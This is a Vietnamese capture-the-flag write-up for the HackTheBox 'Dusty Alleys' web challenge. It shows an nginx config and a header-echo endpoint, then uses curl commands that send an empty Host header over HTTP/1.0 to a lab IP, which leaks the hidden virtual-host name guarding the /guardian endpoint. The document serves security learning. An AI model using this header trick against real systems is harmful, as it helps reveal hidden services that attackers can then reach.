---
title: "DustyAlleys HTTP 1.0"
description: "Writeup for DustyAlleys HTTP 1.0"
author: "toobunbo"
date: "2026-07-04"
categoryEn: "WEB"
categoryJp: "ウェブ"
difficulty: "easy"
tags: ["Web", "HTTP"]
hot: false
cover: "../uploads/toobunbo_Thumbwu.png"
---

# CheatCodeHTB
## Dusty Alleys - HTTP 1.0 so stupid
### Solution

- Server config /alley và /think `listen 80 default_server;
        server_name alley.$SECRET_ALLEY;` nhưng chỉ có ` server_name guardian.$SECRET_ALLEY;` cho `/guardian`
=> Ta cần `$SECRET_ALLAY` để truy cập endpoint /guardian ~~nơi chứa SSRF~~
```config
server {
        listen 80 default_server;
        server_name alley.$SECRET_ALLEY;

    location / {
        root /var/www/html/;  
        index index.html;              
    }

        location /alley {
                        proxy_pass http://localhost:1337;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
        }

        location /think  { 
                        proxy_pass http://localhost:1337;
                        proxy_set_header Host $host;
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;

                        }
}

server {
        listen 80;
                server_name guardian.$SECRET_ALLEY;

        location /guardian {
                        proxy_pass http://localhost:1337;
                        proxy_set_header Host $host; 
                        proxy_set_header X-Real-IP $remote_addr;
                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                        proxy_set_header X-Forwarded-Proto $scheme;
        }
}
```
- Endpoint `/think` trả về request header
```
router.get("/think", async (req, res) => {
  return res.json(req.headers);
});

\\Exam response
{
   "host":"94.237.48.147",
   "x-real-ip":"10.30.18.144",
   "x-forwarded-for":"10.30.18.144",
   "x-forwarded-for:"http",
   "connection":"close",
   "accept-language":"en-US,en;q=0.9",
   "upgrade-insecure-requests":"1",
   "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
   "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
   "accept-encoding":"gzip, deflate, br",
   "if-none-match":"W/\"1ff-LedyLfO3NsGXjDLDeEoUwvsCLx8\""
}
```
- Ta có thể thấy `"x-real-ip", "x-forwarded-for" và "x-forwarded-for" không hề có trong request mà ta gửi. Có thể suy ra được các header này được Proxy thêm vào trong quá trình gửi request
-  Vậy `proxy_set_header Host $host` thì sao, ta có sẵn Host trong header nên /think trả về "host":"94.237.48.147". Vậy nếu ta không truyền "Host", hoặc Host rỗng thì sao? ~~thì Bad Reuqest :)))~~

```
curl -H "Host:" http://94.237.48.147:49291/think
<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx</center>
</body>
</html>
```
### Giao thức HTTP 1.0
- Giao thức HTTP 1.0 không yêu cầu header "Host" trong request header
```
curl -H "Host:" --http1.0 http://94.237.48.147:49291/think
{"host":"alley.firstalleyontheleft.com","x-real-ip":"10.30.18.144","x-forwarded-for":"10.30.18.144","x-forwarded-proto":"http","connection":"close","user-agent":"curl/8.5.0","accept":"*/*"}(base)
```
**WIN** <img width="1077" height="800" alt="image" src="https://github.com/user-attachments/assets/c217ea43-8d21-44d9-bd0d-efdcf9d69f46" />

